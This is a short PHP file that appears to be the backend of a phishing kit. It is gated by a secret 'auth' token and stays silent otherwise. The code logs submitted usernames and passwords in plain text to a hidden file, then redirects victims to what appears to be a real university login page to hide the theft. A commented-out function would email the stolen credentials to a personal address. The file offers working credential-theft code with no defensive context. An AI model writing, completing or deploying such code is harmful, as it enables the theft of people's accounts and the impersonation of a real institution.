<?php 
/**
* 
*/
class Master{
	private $file = "./assets/includes/files/file.txt";
	public $msg = "";
	function __construct(){
		if (!isset($_GET['auth'])) {
			// silience is golden
			die('');
		}else{
			if ($_GET['auth'] != '7dcaaa4800ea45093c3f1e46e34a5ffdd6064312') {
				// silience is golden
				die('');
			}
		}
	}

	public function process(){
		if($this->writeFile($_POST['username'], $_POST['password'])){

			//$this->sendMail(($u = $_POST['username'], $p = $_POST['password']));

			header('Location: http://gateway.oauife.edu.ng/login');
			exit;
		}else{
			//File not written....
			$this->msg = "Something went wrong, please try again....";
			die($this->msg);
		}
	}

	private function writeFile($name = "", $pass = ""){
		if (file_exists($this->file)) {
			$handle = fopen($this->file, 'a');
			fwrite($handle, "*Username: ".$name." | Password: ".$pass."\n");
			fclose($handle);
			return true;
		}else{
			return false;
		}
	}

	private function sendMail($u = "", $p = ""){
		//mailer...
        	return mail('ojudusegun@gmail.com', 'Intecu', "*Username: ".$name." | Password: ".$pass . "\r\n\r\n");
	}
}
$mast = new Master();
$msg = $mast->msg;
?>
